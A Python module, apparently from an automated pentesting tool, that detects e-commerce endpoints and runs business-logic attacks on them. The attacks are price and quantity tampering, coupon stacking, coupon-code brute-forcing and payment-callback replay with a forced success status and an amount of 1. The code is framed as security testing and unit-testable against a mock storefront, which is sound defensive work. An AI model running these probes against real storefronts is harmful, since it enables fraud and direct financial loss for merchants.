"""Phase 1.3 — e-commerce business-logic tampering.

Detects e-commerce surfaces (cart / checkout / payment / coupon endpoints) and
runs the money-losing attacks a human pentester tries first:

  * price / quantity / discount / currency tampering — via the Phase 1.1
    ``WorkflowInterceptor`` (reused, not reimplemented);
  * coupon stacking (apply the same coupon repeatedly) and coupon brute-force;
  * payment-callback replay with a tampered amount / forced-success status.

The coupon and payment probes are pure functions over an injected ``replayer``
callable, so they unit-test against a mock storefront with no live target.
``EcommerceExecutor`` wires them to ``GenericHTTPExecutor._probe`` and
``RequestCapturer`` output at runtime.
"""
from __future__ import annotations

import json
import logging
import time
from typing import Any, Callable, Dict, List, Optional

from core.domain.experiment import SecurityExperiment
from core.execution.executors.base import ExecutionResult, ExecutionStatus
from core.execution.executors.generic import GenericHTTPExecutor
from core.exploitation.workflow_interceptor import (
    SUCCESS_STATUSES,
    ReplayResponse,
    WorkflowInterceptor,
)

logger = logging.getLogger(__name__)

CART_KEYWORDS = ("cart", "basket", "checkout", "order", "payment", "pay",
                 "coupon", "discount", "promo", "voucher", "shipping", "billing",
                 "purchase", "charge", "invoice", "price")
COUPON_KEYWORDS = ("coupon", "discount", "promo", "voucher", "code", "offer", "gift")
PAYMENT_CALLBACK_KEYWORDS = ("callback", "webhook", "ipn", "notify", "confirm",
                             "capture", "return", "success", "complete")
COMMON_COUPONS = ("SAVE10", "SAVE20", "DISCOUNT", "WELCOME", "FREE", "PROMO",
                  "TEST", "OFF50", "BLACKFRIDAY", "NEWUSER", "FIRST")

Replayer = Callable[[Dict[str, Any]], ReplayResponse]


def detect_ecommerce_endpoints(urls: List[str]) -> List[str]:
    return [u for u in urls if any(k in u.lower() for k in CART_KEYWORDS)]


def is_coupon_endpoint(url: str) -> bool:
    return any(k in url.lower() for k in COUPON_KEYWORDS)


def is_payment_callback(url: str) -> bool:
    u = url.lower()
    has_cb = any(k in u for k in PAYMENT_CALLBACK_KEYWORDS)
    has_pay = any(k in u for k in ("pay", "payment", "order", "charge", "checkout",
                                   "webhook", "ipn", "callback", "transaction"))
    return has_cb and has_pay


def coupon_stacking_probe(coupon_url: str, replayer: Replayer,
                          coupon: str = "SAVE10", times: int = 3,
                          method: str = "POST") -> Optional[Dict[str, Any]]:
    """Apply the same coupon repeatedly. If more than one application is
    accepted, the server likely allows discount stacking."""
    statuses: List[int] = []
    for _ in range(max(2, times)):
        resp = replayer({"method": method, "url": coupon_url, "headers": {},
                         "post_data": json.dumps({"coupon": coupon, "code": coupon})})
        statuses.append(resp.status)
    accepted = sum(1 for s in statuses if s in SUCCESS_STATUSES)
    if accepted >= 2:
        return {"test": "coupon_stacking", "url": coupon_url, "coupon": coupon,
                "accepted_applications": accepted, "statuses": statuses,
                "severity": "high"}
    return None


def coupon_bruteforce_probe(coupon_url: str, replayer: Replayer,
                            candidates: tuple = COMMON_COUPONS,
                            method: str = "POST") -> List[Dict[str, Any]]:
    """Probe common coupon codes. A code that responds differently from a known
    invalid baseline is a candidate valid coupon."""
    invalid = replayer({"method": method, "url": coupon_url, "headers": {},
                        "post_data": json.dumps({"coupon": "ZZ_INVALID_ZZ"})})
    valid: List[str] = []
    for c in candidates:
        resp = replayer({"method": method, "url": coupon_url, "headers": {},
                         "post_data": json.dumps({"coupon": c})})
        if resp.status in SUCCESS_STATUSES and (
                resp.status != invalid.status or resp.body != invalid.body):
            valid.append(c)
    if valid:
        return [{"test": "coupon_bruteforce", "url": coupon_url,
                 "valid_coupons": valid, "severity": "medium"}]
    return []


def payment_callback_replay_probe(callback_url: str, replayer: Replayer,
                                  amount_field: str = "amount") -> Optional[Dict[str, Any]]:
    """Replay a payment success callback with a tampered (minimal) amount and a
    forced success status. Acceptance suggests the callback is trusted without
    server-side verification against the payment provider."""
    tampered = json.dumps({amount_field: 1, "status": "success", "paid": True,
                           "state": "completed"})
    resp = replayer({"method": "POST", "url": callback_url, "headers": {},
                     "post_data": tampered})
    if resp.status in SUCCESS_STATUSES:
        return {"test": "payment_callback_replay", "url": callback_url,
                "tampered_amount": 1, "status": resp.status, "severity": "critical",
                "body_snippet": (resp.body or "")[:256]}
    return None


class EcommerceExecutor(GenericHTTPExecutor):

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        base = self._base(experiment)
        if not base:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                   error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        auth_hdrs = self._auth_headers(experiment)
        json_hdrs = {**auth_hdrs, "Content-Type": "application/json"}
        findings: List[Dict[str, Any]] = []

        def _replayer(req: Dict[str, Any]) -> ReplayResponse:
            method = (req.get("method") or "GET").upper()
            pd = req.get("post_data") or ""
            data = pd.encode("utf-8") if (pd and method != "GET") else None
            hdrs = {**json_hdrs, **(req.get("headers") or {})}
            status, body, _ = self._probe(req.get("url", ""), method=method,
                                          headers=hdrs, data=data)
            return ReplayResponse(status=status, body=body or "")

        # Full endpoint URLs (absolute) for pattern detection.
        paths = self._all_endpoints_as_paths(experiment)
        full_urls = [u if u.startswith("http") else f"{base}{u if u.startswith('/') else '/' + u}"
                     for u in paths] or [base]
        ecommerce_urls = detect_ecommerce_endpoints(full_urls) or full_urls[:5]

        # 1. Price/quantity/discount/currency tampering via the interceptor.
        captured = experiment.input_parameters.get("captured_requests")
        if isinstance(captured, list) and captured:
            sequence = [{"method": (c.get("method") or "GET").upper(),
                         "url": c.get("url", ""), "headers": c.get("headers") or {},
                         "post_data": c.get("post_data") or c.get("body") or ""}
                        for c in captured if isinstance(c, dict) and c.get("url")]
        else:
            baseline = json.dumps({"price": 1, "quantity": 1, "amount": 1,
                                   "discount": 0, "currency": "USD"})
            sequence = [{"method": "POST", "url": u, "headers": {}, "post_data": baseline}
                        for u in ecommerce_urls[:15]]
        if sequence:
            for f in WorkflowInterceptor(replayer=_replayer).analyze(sequence):
                findings.append(f.to_dict())

        # 2. Coupon stacking + brute-force on coupon endpoints.
        for u in [u for u in ecommerce_urls if is_coupon_endpoint(u)][:5]:
            stack = coupon_stacking_probe(u, _replayer)
            if stack:
                findings.append(stack)
            findings.extend(coupon_bruteforce_probe(u, _replayer))

        # 3. Payment callback replay.
        for u in [u for u in full_urls if is_payment_callback(u)][:5]:
            pcb = payment_callback_replay_probe(u, _replayer)
            if pcb:
                findings.append(pcb)

        evidence = self.collect_evidence({
            "ecommerce_findings": findings, "findings_count": len(findings),
            "ecommerce_endpoints": ecommerce_urls[:15],
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)
